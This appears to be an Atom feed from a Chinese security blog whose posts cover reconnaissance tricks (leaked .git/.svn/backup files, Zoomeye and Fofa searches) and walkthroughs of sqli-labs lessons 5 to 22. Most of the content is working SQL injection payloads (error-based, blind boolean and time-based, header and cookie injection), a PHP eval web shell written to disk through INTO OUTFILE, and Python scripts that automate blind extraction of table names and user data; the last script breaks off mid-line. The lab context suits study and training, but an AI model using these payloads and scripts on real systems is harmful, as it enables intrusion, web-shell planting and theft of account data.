<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Diam1st&#39;s blog</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0xmj.club/"/>
  <updated>2018-04-02T08:19:00.725Z</updated>
  <id>http://0xmj.club/</id>
  
  <author>
    <name>Diam1st</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>信息收集</title>
    <link href="http://0xmj.club/2018/04/02/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://0xmj.club/2018/04/02/信息收集/</id>
    <published>2018-04-02T08:15:51.000Z</published>
    <updated>2018-04-02T08:19:00.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201803241742_133.png" alt=""></p><p>1、robots.txt<br>2、网站备份压缩文件<br>    可能为.rar、zip、.7z、.tar.gz、.bak、.txt、.swp等等，以及和网站信息有关的文件名www.rar、web、rar等等<br>3、Git导致文件泄露<br><img src="http://oy0tigw51.bkt.clouddn.com/201803241744_967.png" alt=""><br>4、DS_store导致文件泄露<br>5、SVN导致文件泄露<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p><pre><code>1) 漏洞利用工具： Seay SVN漏洞利用工具2) 添加网站url</code></pre><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br>6、WEB-INF/web.xml泄露<br>        6.1、环境搭建<br>        6.2、访问页面<br>        6.3、扫描<br>        6.4、验证结果<br>7、Zoomeye搜索引擎使用<br>        7.1、搜索规则<br>        7.2、搜索技巧<br>        7.3、实战搜索<br>8、bing搜索引擎使用<br>9、Fofa搜索<br>10、站长工具<br>        10.1、站长工具Whois<br>        10.2、seo综合查询<br>        10.3、站长工具tool</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51.bkt.clouddn.com/201803241742_133.pn
      
    
    </summary>
    
      <category term="渗透" scheme="http://0xmj.club/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="信息收集" scheme="http://0xmj.club/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs less11-15</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs-less11-15/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs-less11-15/</id>
    <published>2018-04-02T08:15:38.000Z</published>
    <updated>2018-04-02T08:17:50.790Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-less11-15"><a href="#sqli-labs-less11-15" class="headerlink" title="sqli-labs less11-15"></a>sqli-labs less11-15</h1><p>[toc]</p><h3 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h3><p>uname=1’ or 1=1 # &amp;passwd=x</p><h3 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h3><p>uname=1”) or 1=1 # &amp;passwd=x</p><h3 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h3><p>username：1’<br>Password： （随便输）<br>报错：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘12’) LIMIT 0,1’ at line 1<br>‘) 我们可以知道程序对 id 进行了 ‘) 的处理。</p><p>uname=1’) or 1=1 # &amp;passwd=x</p><h3 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h3><p>uname=admin”and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit</p><p>###less15POST型基于时间盲注<br>uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Subm<br>it</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>uname=”) or 1=1#&amp;passwd=x<br>或<br>uname=”) or if(length(database())=8,1,sleep(2))#&amp;passwd=x</p><h3 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h3><p>Username：admin<br>Password：1’ You have an error in your SQL syntax; check the manual that corresponds<br>to your MySQL server version for the right syntax to use near ‘admin’’<br>at line 1<br>可以看到 admin’’ 说明在对密码的处理过程中使用的是 ‘’ 。<br>接下来利用盲注进行注入。<br>这里首先演示一下报错类型的盲注。<br>uname=admin&amp;passwd=1’ and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</p><p>Less-18 Header Injection- Error Based- string<br>在header里的User-Agent后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-19 Header Injection- Referer- Error Based- string<br>在header里的Referer后跟上payload：<br>‘ or updatexml(1,concat(0x5e,(select database() ),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 0,1),0x5e),1),”,”)#<br>‘ or updatexml(1,concat(0x5e,(select email_id from emails limit 0,1),0x5e),1),”,”)#</p><p>Less-20 Cookie Injection- Error Based- string<br>在header里的Cookie附上payload：<br>uname=admin’ order by 3#<br>uname=x’ union select 1,database(),3#<br>uname=x’ union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’ union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-21 Cookie Injection- Error Based- complex - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin’) order by 3#<br>uname=x’) union select 1,database(),3#<br>uname=x’) union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x’) union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p><p>Less-22 Cookie Injection- Error Based- Double Quotes - string<br>这里Cookie设置为以下payload的base64编码形式即可<br>uname=admin” order by 3#<br>uname=x” union select 1,database(),3#<br>uname=x” union select 1,group_concat(0x5e,(select table_name from information_schema.tables where table_schema=”security” limit 0,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select column_name from information_schema.columns where table_name=”emails” limit 1,1),0x5e),3 #<br>uname=x” union select 1,group_concat(0x5e,(select email_id from emails limit 0,1),0x5e),3 #</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs-less11-15&quot;&gt;&lt;a href=&quot;#sqli-labs-less11-15&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs less11-15&quot;&gt;&lt;/a&gt;sqli-labs less11-15&lt;/h1&gt;&lt;p&gt;[t
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs  less7-10</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs-less7-10/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs-less7-10/</id>
    <published>2018-04-02T08:15:23.000Z</published>
    <updated>2018-04-02T08:17:04.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs-less7-10"><a href="#sqli-labs-less7-10" class="headerlink" title="sqli-labs  less7-10"></a>sqli-labs  less7-10</h1><p>[toc]</p><h3 id="less-7：GET-基于错误-双引号-文件导出"><a href="#less-7：GET-基于错误-双引号-文件导出" class="headerlink" title="less-7：GET-基于错误-双引号-文件导出"></a>less-7：GET-基于错误-双引号-文件导出</h3><p>练习mysql的文件写入。我们的目的是将一句话木马写入到网站的Less-7目录下</p><p>先去用 ‘ “  之类的测试<br>发现，用 “ 返回页面无变化，用 ‘ 返回页面出错，说明这个结构肯定是带 ‘ 的。</p><p>‘ 的返回页面为：<br><img src="http://oy0tigw51.bkt.clouddn.com/201803172221_893.png" alt=""></p><p>但是绝对和单引号有关，所以试试 ‘)  ,  ‘))</p><p>‘) 也错了</p><p>‘)) 返回页面正常！！</p><p>说明sql语句应该是这样：</p><pre><code> select * from table where id = ((&#39;input&#39;));</code></pre><p><a href="http://43.247.91.228:84/Less-7/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-7/?id=1</a>‘)) union select 1,2,”&lt;?php @eval($_POST[‘cmd’]); ?&gt;” into outfile “/var/www/html/dd1.php”</p><h3 id="less-8：GET-基于布尔类型-盲注"><a href="#less-8：GET-基于布尔类型-盲注" class="headerlink" title="less-8：GET-基于布尔类型-盲注"></a>less-8：GET-基于布尔类型-盲注</h3><p>发现加个单引号跟没加显示不一样，加了单引号连you are in都不显示了，没有报错，所以只能用盲注判断了<br><a href="http://43.247.91.228:84/Less-8/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-8/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;64 %23  </p><p>放一个脚本：</p><pre><code># coding: utf-8import urllib2import urllibsuccess_str = &quot;You are in&quot;getTable = &quot;users&quot;index = &quot;0&quot;url = &quot;http://43.247.91.228:84/Less-8/?id=1&quot;database = &quot;database()&quot;selectDB = &quot;select database()&quot;selectTable = &quot;select table_name from information_schema.tables where table_schema=&#39;%s&#39; limit %d,1&quot;asciiPayload = &quot;&#39; and ascii(substr((%s),%d,1))&gt;=%d #&quot;lengthPayload = &quot;&#39; and length(%s)&gt;=%d #&quot;selectTableCountPayload = &quot;&#39;and (select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)&gt;=%d #&quot;selectTableNameLengthPayloadfront = &quot;&#39;and (select length(table_name) from information_schema.tables where table_schema=&#39;%s&#39; limit &quot;selectTableNameLengthPayloadbehind = &quot;,1)&gt;=%d #&quot;# 获取字符串的长度def getLengthOfString(payload, string):    # 猜长度    lengthLeft = 0    lengthRigth = 0    guess = 10    # 确定长度上限，每次增加5    while 1:        # 如果长度大于guess        if getLengthResult(payload, string, guess) == True:            # 猜测值增加5            guess = guess + 5        else:            lengthRigth = guess            break            # print &quot;lengthRigth: &quot; + str(lengthRigth)    # 二分法查长度    mid = (lengthLeft + lengthRigth) / 2    while lengthLeft &lt; lengthRigth - 1:        # 如果长度大于等于mid        if getLengthResult(payload, string, mid) == True:            # 更新长度的左边界为mid            lengthLeft = mid        else:            # 否则就是长度小于mid            # 更新长度的右边界为mid            lengthRigth = mid            # 更新中值        mid = (lengthLeft + lengthRigth) / 2        # print lengthLeft, lengthRigth    # 因为lengthLeft当长度大于等于mid时更新为mid，而lengthRigth是当长度小于mid时更新为mid    # 所以长度区间：大于等于 lengthLeft，小于lengthRigth    # 而循环条件是 lengthLeft &lt; lengthRigth - 1，退出循环，lengthLeft就是所求长度    # 如循环到最后一步 lengthLeft = 8， lengthRigth = 9时，循环退出，区间为8&lt;=length&lt;9,length就肯定等于8    return lengthLeft# 获取名称def getName(payload, string, lengthOfString):    # 32是空格，是第一个可显示的字符，127是delete，最后一个字符    tmp = &#39;&#39;    for i in xrange(1, lengthOfString + 1):        left = 32        right = 127        mid = (left + right) / 2        while left &lt; right - 1:            # 如果该字符串的第i个字符的ascii码大于等于mid            if getResult(payload, string, i, mid) == True:                # 则更新左边界                left = mid                mid = (left + right) / 2            else:                # 否则该字符串的第i个字符的ascii码小于mid                # 则更新右边界                right = mid                # 更新中值            mid = (left + right) / 2        tmp += chr(left)    return tmp# 发送请求，根据页面的返回的判断长度的猜测结果# string:猜测的字符串 payload:使用的payload  length：猜测的长度def getLengthResult(payload, string, length):    finalUrl = url + urllib.quote(payload % (string, length))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False # 发送请求，根据页面的返回的判断猜测的字符是否正确# payload:使用的payload    string:猜测的字符串   pos：猜测字符串的位置    ascii：猜测的asciidef getResult(payload, string, pos, ascii):    finalUrl = url + urllib.quote(payload % (string, pos, ascii))    res = urllib2.urlopen(finalUrl)    if success_str in res.read():        return True    else:        return False# 注入def inject():    # 猜数据库长度    lengthOfDBName = getLengthOfString(lengthPayload, database)    print &quot;length of DBname: &quot; + str(lengthOfDBName)    # 获取数据库名称    DBname = getName(asciiPayload, selectDB, lengthOfDBName)    print &quot;current database:&quot; + DBname    # 获取数据库中的表的个数    # print selectTableCountPayload    tableCount = getLengthOfString(selectTableCountPayload, DBname)    print &quot;count of talbe:&quot; + str(tableCount)    # 获取数据库中的表    for i in xrange(0, tableCount):        # 第几个表        num = str(i)        # 获取当前这个表的长度        selectTableNameLengthPayload = selectTableNameLengthPayloadfront + num + selectTableNameLengthPayloadbehind        tableNameLength = getLengthOfString(selectTableNameLengthPayload, DBname)        print &quot;current table length:&quot; + str(tableNameLength)        # 获取当前这个表的名字        selectTableName = selectTable % (DBname, i)        tableName = getName(asciiPayload, selectTableName, tableNameLength)        print tableName    selectColumnCountPayload = &quot;&#39;and (select count(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39;)&gt;=%d #&quot;    # print selectColumnCountPayload    # 获取指定表的列的数量    columnCount = getLengthOfString(selectColumnCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of column:&quot; + str(columnCount)    # 获取该表有多少行数据    dataCountPayload = &quot;&#39;and (select count(*) from %s)&gt;=%d #&quot;    dataCount = getLengthOfString(dataCountPayload, getTable)    print &quot;table:&quot; + getTable + &quot; --count of data: &quot; + str(dataCount)    data = []    # 获取指定表中的列    for i in xrange(0, columnCount):        # 获取该列名字长度        selectColumnNameLengthPayload = &quot;&#39;and (select length(column_name) from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit &quot; + str(            i) + &quot;,1)&gt;=%d #&quot;        # print selectColumnNameLengthPayload        columnNameLength = getLengthOfString(selectColumnNameLengthPayload, getTable)        print &quot;current column length:&quot; + str(columnNameLength)        # 获取该列的名字        selectColumn = &quot;select column_name from information_schema.columns where table_schema=&#39;&quot; + DBname + &quot;&#39; and table_name=&#39;%s&#39; limit %d,1&quot;        selectColumnName = selectColumn % (getTable, i)        # print selectColumnName        columnName = getName(asciiPayload, selectColumnName, columnNameLength)        print columnName        tmpData = []        tmpData.append(columnName)        # 获取该表的数据        for j in xrange(0, dataCount):            columnDataLengthPayload = &quot;&#39;and (select length(&quot; + columnName + &quot;) from %s limit &quot; + str(j) + &quot;,1)&gt;=%d #&quot;            # print columnDataLengthPayload            columnDataLength = getLengthOfString(columnDataLengthPayload, getTable)            # print columnDataLength            selectData = &quot;select &quot; + columnName + &quot; from users limit &quot; + str(j) + &quot;,1&quot;            columnData = getName(asciiPayload, selectData, columnDataLength)            # print columnData            tmpData.append(columnData)        data.append(tmpData)        # print data    # 格式化输出数据    # 输出列名    tmp = &quot;&quot;    for i in xrange(0, len(data)):        tmp += data[i][0] + &quot;   &quot;    print tmp    # 输出具体数据    for j in xrange(1, dataCount + 1):        tmp = &quot;&quot;        for i in xrange(0, len(data)):            tmp += data[i][j] + &quot;   &quot;        print tmpif __name__ == &quot;__main__&quot;:    print &quot;-----------inject starting----------&quot;    inject()</code></pre><p>与less5相似</p><h3 id="less-9：GET-基于时间类型-盲注"><a href="#less-9：GET-基于时间类型-盲注" class="headerlink" title="less-9：GET-基于时间类型-盲注"></a>less-9：GET-基于时间类型-盲注</h3><p>基于时间的盲注，只用修改一下上面的python脚本即可实现，加个时间判断，payload：<br><a href="http://127.0.0.1/sql/Less-9/?id=1" target="_blank" rel="external">http://127.0.0.1/sql/Less-9/?id=1</a>‘ and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(2)) %23<br>这里if判断为真，所以会执行sleep(2)，查询操作会有明显的延迟。如果为假，即不正确，那么就不会执行sleep(2)，页面回显会明显的很快。<br>在了解了这些基本知识之后，我们使用一下payload来sql注入<br><a href="http://192.168.1.158/sqli-labs/Less-8/?id=1‘" target="_blank" rel="external">http://192.168.1.158/sqli-labs/Less-8/?id=1‘</a> and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+</p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第10关只要把前面两关payload部分的单引号改成双引号即可。<br>猜测数据库：<br><a href="http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+" target="_blank" rel="external">http://127.0.0.1/sqllib/Less-10/?id=1&quot;and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs-less7-10&quot;&gt;&lt;a href=&quot;#sqli-labs-less7-10&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs  less7-10&quot;&gt;&lt;/a&gt;sqli-labs  less7-10&lt;/h1&gt;&lt;p&gt;[toc
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqlilabs" scheme="http://0xmj.club/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs5-6(盲注)</title>
    <link href="http://0xmj.club/2018/04/02/sqli-labs5-6-%E7%9B%B2%E6%B3%A8/"/>
    <id>http://0xmj.club/2018/04/02/sqli-labs5-6-盲注/</id>
    <published>2018-04-02T08:14:58.000Z</published>
    <updated>2018-04-02T08:16:24.327Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs5-6-盲注"><a href="#sqli-labs5-6-盲注" class="headerlink" title="sqli-labs5-6(盲注)"></a>sqli-labs5-6(盲注)</h1><p>[toc]</p><p>盲注分为以下三类：</p><p>Booleanbase（普通盲注）<br>Timebase（时间盲注）<br>Errorbase（基于报错的盲注）</p><h2 id="less-5：GET-基于错误-单引号-复杂注入语句"><a href="#less-5：GET-基于错误-单引号-复杂注入语句" class="headerlink" title="less-5：GET-基于错误-单引号-复杂注入语句"></a>less-5：GET-基于错误-单引号-复杂注入语句</h2><h3 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h3><p>如果所查询的用户id在数据库中，可以发现页面显示”You are in”，而不像前4关那样会显示出具体的账号密码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171030_947.png" alt=""><br>如果sql语句查询结果不存在，则不会显示”You are in”</p><p>这种类型的SQL注入属于盲注型，使用id=1\观察报错信息<br><a href="http://43.247.91.228:84/Less-5/?id=1\" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1\</a></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171016_51.png" alt=""></p><pre><code> MySQL server version for the right syntax to use near &#39;&#39;1\&#39; LIMIT 0,1&#39; at line 1</code></pre><p>错误分析：</p><p>near ‘’1’’ LIMIT 0,1’ at line 1</p><p>分离最外层的单引号：</p><p>near ‘       ‘   1’  ‘ LIMIT 0,1            ‘ at line 1</p><p>1’是手动输入的，但是还剩下一对双引号，说明后台sql语句应该是这样：</p><p>select * from talbe where id = ‘input’ </p><h3 id="2-猜测当前数据库长度："><a href="#2-猜测当前数据库长度：" class="headerlink" title="2.猜测当前数据库长度："></a>2.猜测当前数据库长度：</h3><p>首先获取当前数据库名的长度，用于之后的数据库名猜解<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=7)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_250.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and (length(database())=8)–+<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171110_312.png" alt=""><br>上面的数字你可以从1开始递增，发现在 length(database())=8的时候，页面返回了正确信息，这说明当前数据库名长度为8</p><h3 id="3-猜测当前数据库名"><a href="#3-猜测当前数据库名" class="headerlink" title="3.猜测当前数据库名"></a>3.猜测当前数据库名</h3><p>方法一： python跑</p><pre><code>import requestsimport stringdataset = &quot; abcdefghijklmnopqrstuvwxyz_&quot;def sendPayload(payload):    url = &quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+ payload    content = requests.get(url).text    return contentdef get_db_length():    count = 1    while count:        payload = &quot;and length(database())=&quot;        payload = payload + str(count) + &quot;%23&quot;        recv = sendPayload(payload)        if &quot;You are in&quot; in recv:            return count        else:            count += 1def getdbName(length):    result=&quot;&quot;    for k in range(length+1):            for j in dataset:                    payload=&quot;and left(database(),&quot;+str(k)+&quot;)=&#39;&quot;+result+j+&quot;&#39;%23&quot;                    recv=sendPayload(payload)                    if &quot;You are in&quot; in recv:                        if j !=&#39; &#39;:                            result+=j                            print result                        breakdef main():    length = get_db_length()     print &quot;the length of database is &quot;,length     getdbName(length)if __name__==&quot;__main__&quot;:    main()</code></pre><p>这里跑出来以后数据库名字是security。<br>方法二手注left：<br><a href="http://43.247.91.228:84/Less-5/?id=1‘" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1‘</a> and (left(database(),1)=’s’)–+<br>left(database(),1)=’s’表示数据库名从左往右取一个字符，判断该字符是否等于s<br>left(database(),2)=’se’表示数据库名从左往右取两个个字符，判断该字符是否等于se</p><p>方法三：使用ascii()函数和substr()函数进行夹逼 </p><blockquote><p>▲ascii(substr((select database()),1,1))=98<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p></blockquote><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&gt;114%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_827.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))&lt;116%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171141_686.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),1,1))=115%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171142_763.png" alt=""><br>所以当前数据库名的第一位字符为’s’。</p><p>猜测当前数据库名的第二位字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select database()),2,1)&gt;100%23<br>以此类推，最后得到当前数据库名为“security”。 </p><h3 id="4-猜测当前数据库的表名"><a href="#4-猜测当前数据库的表名" class="headerlink" title="4.猜测当前数据库的表名"></a>4.猜测当前数据库的表名</h3><p>猜测第一个数据表名的第一个字符：<br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_213.png" alt=""><br><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;102%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201803171307_338.png" alt=""><br>d’&lt;’当前数据库第一个表名的第一个字符’&lt;’f’<br>当前数据库第一个表名的第一个字符为’e’。</p><p><a href="http://43.247.91.228:84/Less-5/?id=1" target="_blank" rel="external">http://43.247.91.228:84/Less-5/?id=1</a>‘  and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108%23</p><p>方法二：</p><p>已经获取了数据库的名称，现在需要查出表的名称，这里需要使用ascii和substr这两个函数了。<br>获取完整表名有两个步骤：<br>①获取表的长度；<br>②利用ascii码获取单个表字符然后叠加。</p><pre><code>#!/usr/bin/env python#coding=utf-8import requestsimport stringdef get_data(payload):    url=&quot;http://localhost/sqli-labs-master/Less-5/?id=1&#39; &quot;+payload    content=requests.get(url).text    return contentdef get_table_length(i):    for j in range(0,20):        payload=&quot;and (select length(table_name) from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1)=&quot;+str(j)+&quot;%23&quot;        #print payload        recv=get_data(payload)        if &quot;You are in&quot; in recv:            #print j            return jdef get_TableName():    for i in range(0,20):        result=&quot;&quot;        table_length=get_table_length(i)        if table_length is None:            break        #print table_length        for j in range(table_length+1):            for k in range(48,122):                payload=&quot;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &quot;+str(i)+&quot;,1),&quot;+str(j)+&quot;,1))=&quot;+str(k)+&quot;%23&quot;                recv=get_data(payload)                if &quot;You are in&quot; in recv:                    result+=chr(k)                    print result                    breakdef main():    get_TableName()if __name__==&quot;__main__&quot;:    main()</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803171315_415.png" alt=""></p><h3 id="5-爆列名-表users下的所有列名"><a href="#5-爆列名-表users下的所有列名" class="headerlink" title="5.爆列名(表users下的所有列名)"></a>5.爆列名(表users下的所有列名)</h3><p>接下来就要猜解每个表里的列的个数、列名以及列名长度，列名猜解，和上面原理都差不多，这里不再赘述，直接给出payload(以users表为例子)。<br>猜解列的个数<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and %d=(select count(column_name) from information_schema.columns where table_name=’users’)–+<br>猜解列名长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))–+<br>猜解列名<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select column_name from information_schema.columns where table_name=”users” limit 0,1),1,1))=97–+</p><h3 id="6-爆出字段值-security-users下所有的账号密码"><a href="#6-爆出字段值-security-users下所有的账号密码" class="headerlink" title="6.爆出字段值(security.users下所有的账号密码)"></a>6.爆出字段值(security.users下所有的账号密码)</h3><p>最后就是要猜解每个列里面的具体字段的长度以及值了(这里以猜解username为例)<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and 1=(select count(username) from security.users)–+<br>判断字段长度<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))–+<br>判断字段值<br><a href="http://127.0.0.1/sqlilabs/Less-5/?id=1‘" target="_blank" rel="external">http://127.0.0.1/sqlilabs/Less-5/?id=1‘</a> and ascii(substr((select username from security.users limit 0,1),1,1))=95–+</p><h3 id="完整python代码"><a href="#完整python代码" class="headerlink" title="完整python代码"></a>完整python代码</h3><pre><code>import requestsurl = &#39;http://192.168.1.158/sqlilabs/Less-5/?id=1&#39;db_length = 0db_name = &#39;&#39;table_num = 0table_len = 0table_name = &#39;&#39;table_list = []column_num = 0column_len = 0column_name = &#39;&#39;column_list = []dump_num = 0dump_len = 0dump_name = &#39;&#39;dump_list = []i = j = k = 0### 当前数据库名长度 ###for i in range(1,20):    db_payload = &#39;&#39;&#39;&#39; and (length(database())=%d)--+&#39;&#39;&#39; %i    # print(url+db_payload)    r = requests.get(url+db_payload)    if &quot;You are in&quot; in r.text:        db_length = i        print(&#39;当前数据库名长度为：%d&#39; % db_length)        break### 当前数据库名 ###print(&#39;开始猜解数据库名......&#39;)for i in range(1,db_length+1):    for j in range(95,123):        db_payload = &#39;&#39;&#39;&#39; and (left(database(),%d)=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name+chr(j))        r = requests.get(url+db_payload)        if &quot;You are in&quot; in r.text:            db_name += chr(j)            # print(db_name)            breakprint(&#39;数据库名：\n[+]&#39;,db_name)### 当前数据库表的数目 ###for i in range(100):    db_payload = &#39;&#39;&#39;&#39; and %d=(select count(table_name) from information_schema.tables where table_schema=&#39;%s&#39;)--+&#39;&#39;&#39; % (i,db_name)    r = requests.get(url+db_payload)    # print(url+db_payload)    if &quot;You are in&quot; in r.text:        table_num = i        breakprint(&#39;一共有%d张表&#39; % table_num)print(&#39;开始猜解表名......&#39;)### 每张表的表名长度及表名 ###for i in range(table_num):    table_len = 0    table_name = &#39;&#39;    #### 表名长度 ####    for j in range(1,21):        db_payload = &#39;&#39;&#39;&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit %d,1),%d,1))--+&#39;&#39;&#39; % (i,j)        r = requests.get(url+db_payload)        # print(db_payload)        if &quot;You are in&quot; not in r.text:            table_len = 